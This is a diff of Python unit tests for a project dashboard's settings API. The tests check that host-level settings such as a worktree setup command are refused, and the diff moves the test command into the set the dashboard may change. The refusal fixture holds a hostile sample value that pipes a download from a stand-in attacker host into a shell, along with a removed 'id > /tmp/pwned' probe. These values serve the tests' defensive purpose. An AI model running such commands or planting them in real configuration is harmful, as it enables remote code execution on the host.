@@ -333,7 +333,7 @@ class HostLevelSettingsTests(unittest.TestCase):
         _seed(self.db_path, self.temp.name)
         with ForemanStore(self.db_path) as store:
             project = store.get_project("p1")
-            project.settings = {"test_command": "make test", "max_step_visits": 5}
+            project.settings = {"worktree_setup_command": "make deps", "max_step_visits": 5}
             store.save_project(project)
         self.app = create_dashboard_app(str(self.db_path))
 
@@ -343,7 +343,6 @@ class HostLevelSettingsTests(unittest.TestCase):
 
     def test_each_host_level_setting_is_refused_and_nothing_is_stored(self) -> None:
         attempts = {
-            "test_command": "id > /tmp/pwned",
             "worktree_setup_command": "curl https://evil.example | sh",
             "worktree_root": "/home",
             "worktree_link_paths": ["venv"],
@@ -367,22 +366,35 @@ class HostLevelSettingsTests(unittest.TestCase):
             self.app,
             "PATCH",
             "/api/projects/p1/settings",
-            json={"settings": {"max_step_visits": 9, "test_command": "id"}},
+            json={"settings": {"max_step_visits": 9, "worktree_setup_command": "id"}},
         )
         self.assertEqual(response.status_code, 403)
         self.assertEqual(self._settings()["max_step_visits"], 5)
 
     def test_the_settings_panel_can_send_back_what_it_read(self) -> None:
         current = _request(self.app, "GET", "/api/projects/p1/settings").json()
-        self.assertIn("test_command", current["host_level_settings"])
+        self.assertIn("worktree_setup_command", current["host_level_settings"])
+        self.assertNotIn("test_command", current["host_level_settings"])
         payload = dict(current["settings"], max_step_visits=7, worktree_root="", judge_base_url="")
         response = _request(
             self.app, "PATCH", "/api/projects/p1/settings", json={"settings": payload}
         )
         self.assertEqual(response.status_code, 200, response.text)
         self.assertEqual(self._settings()["max_step_visits"], 7)
-        self.assertEqual(self._settings()["test_command"], "make test")
+        self.assertEqual(self._settings()["worktree_setup_command"], "make deps")
         self.assertNotIn("worktree_root", self._settings())
+
+    def test_the_test_command_is_set_from_the_dashboard(self) -> None:
+        # The owner, 2026-11-19: the test command is the project's, not the
+        # host's; the dashboard sets it (ADR-0017 amendment).
+        response = _request(
+            self.app,
+            "PATCH",
+            "/api/projects/p1/settings",
+            json={"settings": {"test_command": "make check"}},
+        )
+        self.assertEqual(response.status_code, 200, response.text)
+        self.assertEqual(self._settings()["test_command"], "make check")
 
     def test_the_cli_still_sets_host_level_settings(self) -> None:
         from foreman.cli import main
